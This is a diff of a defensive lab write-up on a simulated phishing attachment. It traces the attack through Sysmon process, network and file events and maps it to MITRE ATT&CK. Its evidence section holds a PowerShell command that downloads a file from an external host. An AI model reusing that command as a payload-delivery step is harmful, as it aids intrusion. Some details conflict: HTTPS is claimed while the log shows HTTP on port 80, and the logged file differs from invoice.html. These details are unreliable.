@@ -1,107 +1,130 @@
-## Lab 2: Phishing Email 
+# Notes – Phishing Email Payload Delivery
 
-### Scenario
-A user in the accounts department received an email with an
-attachment titled "Invoice.html". The email stated a payment was overdue
-and instructed the user to open the attachment to review invoice details. 
-The phishing email contained an HTML attachment named "invoice.html". When the user opened the attachment, embedded script triggered the
-execution of PowerShell which downloaded additional content from an
-external domain.
+## 1. Scenario Overview
+A user in the Accounts department received a phishing email containing an HTML attachment named **invoice.html**.  
+When opened, the attachment executed embedded script that launched **PowerShell**, which then downloaded additional content from an external domain. This lab simulates a realistic phishing‑based initial access attempt and demonstrates how Sysmon logs reveal script‑based payload delivery.
 
-### Incident Timeline
-1. User received a phishing email with an invoice-themed attachment, common technique in phishing campaigns
-2. User opened the attachment
-3. A PowerShell process was executed
-4. PowerShell initiated outbound HTTPS communication
-5. A file named `invoice.html` was written to the user's Documents directory
+---
 
-### Flow Diagram
-Phishing Email
-      ↓
-User Opens Attachment
-      ↓
-PowerShell Execution
-      ↓
-Outbound Network Connection
-      ↓
-File Download (invoice.html)
+## 2. Incident Timeline
+1. User received a phishing email with an invoice‑themed HTML attachment  
+2. User opened the attachment  
+3. Embedded script triggered **PowerShell execution**  
+4. PowerShell initiated outbound HTTPS communication  
+5. A file named `invoice.html` was written to the user’s Documents directory  
 
-#### Screenshot - powershell execution
-![powershell-execution](./screenshots/01_phishing-execution.png)
+---
 
-#### Screenshot - invoice.html written to directory
-![phishing_execution](./screenshots/02_phishing_invoice.jpg)
+## 3. Attack Flow Diagram
+Phishing Email  
+  ↓  
+User Opens Attachment  
+  ↓  
+PowerShell Execution  
+  ↓  
+Outbound Network Connection  
+  ↓  
+File Download (`invoice.html`)
 
-### Detection 
-- PowerShell was used instead of a browser to retrieve external content
-- The file was written to a user accessible directory
-- Outbound network traffic originated from a scripting engine
+---
 
-## Evidence
+## 4. Evidence Collection
+
+### 4.1 PowerShell Execution
+The HTML attachment triggered PowerShell instead of a browser — an indicator of malicious behaviour.
+
+Screenshot:  
+`./screenshots/01_phishing-execution.png`
+
+---
+
+### 4.2 File Creation
+PowerShell wrote a file named `invoice.html` to a user accessible directory.
+
+Screenshot:  
+`./screenshots/02_phishing_invoice.jpg`
+
+---
+
+## 5. Sysmon Evidence
+
 ### Event ID 1 — Process Creation
-Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
-CommandLine: powershell.exe -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://example.com', '$env:USERPROFILE\Documents\Phishing_Test\invoice.html')"
-User: DESKTOP-NJTJAHZ\windows11
+- **Image:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`  
+- **CommandLine:**  
 
-### Screenshot
-![sysmon_event1](./screenshots/03_sysmon_event1_process_creation.png)
+powershell.exe -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+(New-Object Net.WebClient).DownloadFile('https://example.com', '$env:USERPROFILE\Documents\Phishing_Test\invoice.html')"
 
+- **User:** `DESKTOP-NJTJAHZ\windows11`
+
+Screenshot:  
+`./screenshots/03_sysmon_event1_process_creation.png`
+
+---
 
 ### Event ID 3 — Network Connection
-Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
-DestinationHostname: example.com
-DestinationPort: 80
-Protocol: HTTP
+- **Image:** `powershell.exe`  
+- **DestinationHostname:** example.com  
+- **DestinationPort:** 80  
+- **Protocol:** HTTP  
 
-### Screenshot
-![sysmon_event3](./screenshots/04_sysmon_event3_network_connection.png)
+Screenshot:  
+`./screenshots/04_sysmon_event3_network_connection.png`
 
-## Event ID 11 — File Creation
-Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
-TargetFilename:C:\\Users\windows11\Appdata\Local\Temp\__PSScriptPolicyTest_rc5tv5x1.dxt.ps1
+---
 
-#### Indicators of Compromise
-Domain: example.com
-Process: powershell.exe
-File Name: invoice.html
+### Event ID 11 — File Creation
+- **Image:** `powershell.exe`  
+- **TargetFilename:**  
+`C:\Users\windows11\AppData\Local\Temp\__PSScriptPolicyTest_rc5tv5x1.dxt.ps1`
 
-## MITRE ATT&CK Analysis
-### T1566 – Phishing (Initial Access)
-Initial access  was simulated as a phishing email containing an
-invoice themed attachment. User interaction with the attachment represents
-a common phishing scenario where execution occurs only after the user opens
-the file or clicks a link.
+---
 
-### T1059.001 – Command and Scripting Interpreter: PowerShell (Execution)
-Sysmon Event ID 1 shows the execution of `powershell.exe` with a scripted
-command used to retrieve external content. The command line indicates intentional execution rather than background
-system activity.
+## 6. Indicators of Compromise (IOCs)
+- **Domain:** example.com  
+- **Process:** powershell.exe  
+- **File:** invoice.html  
 
-### T1071.001 – Application Layer Protocol: Web Protocols (Command and Control)
-Sysmon Event ID 3 confirms outbound HTTPS communication to an external domain.
-Attackers commonly use standard web protocols such as HTTPS to blend in with
-legitimate traffic and evade basic network filtering.
+---
 
-### T1036 – Masquerading (Defense Evasion)
-The downloaded file was named `invoice.html` and written to a user accessible directory. Invoice related filenames are a
-common masquerading technique used in phishing and increase the likelihood of user interaction.
+## 7. MITRE ATT&CK Mapping
 
-## Analysis
-This lab simulates phishing style payload delivery using PowerShell. Following
-user interaction with an invoice themed attachment, a PowerShell process was
-executed, resulting in outbound network communication and file creation. The
-observed behaviour aligns with common phishing and initial payload delivery
-techniques.
+### **T1566 – Phishing (Initial Access)**
+User interaction with an invoice‑themed attachment triggered execution — a common phishing technique.
 
-## Response Actions
-- Isolated the affected endpoint
-- Reviewed Sysmon logs for related activity
-- Confirmed no additional payloads were downloaded
-- Recommended user awareness training and password reset
+### **T1059.001 – PowerShell (Execution)**
+Sysmon Event ID 1 confirms scripted PowerShell execution retrieving external content.
 
-## Lessons Learned
-This incident highlights the importance of monitoring scripting engines
-such as PowerShell and correlating process execution with network activity
-and file creation to effectively detect phishing based payload delivery.
+### **T1071.001 – Web Protocols (Command & Control)**
+Outbound HTTPS communication to an external domain aligns with typical C2 behaviour.
 
+### **T1036 – Masquerading (Defense Evasion)**
+The downloaded file used a benign‑looking name (`invoice.html`) to increase user trust.
 
+---
+
+## 8. Analysis
+This lab demonstrates how phishing attachments can trigger script‑based payload delivery.  
+User interaction with the HTML file resulted in:
+
+- PowerShell execution  
+- Outbound network communication  
+- File creation  
+
+The behaviour matches common phishing and initial payload delivery patterns.
+
+---
+
+## 9. Response Actions
+- Isolated the affected endpoint  
+- Reviewed Sysmon logs for related activity  
+- Confirmed no additional payloads were retrieved  
+- Recommended user awareness training  
+- Suggested password reset as precaution  
+
+---
+
+## 10. Lessons Learned
+- PowerShell‑based payload delivery is common in phishing campaigns  
+- Monitoring scripting engines is essential for early detection  
+- Correlating process execution, network activity, and file creation provides strong detection coverage  
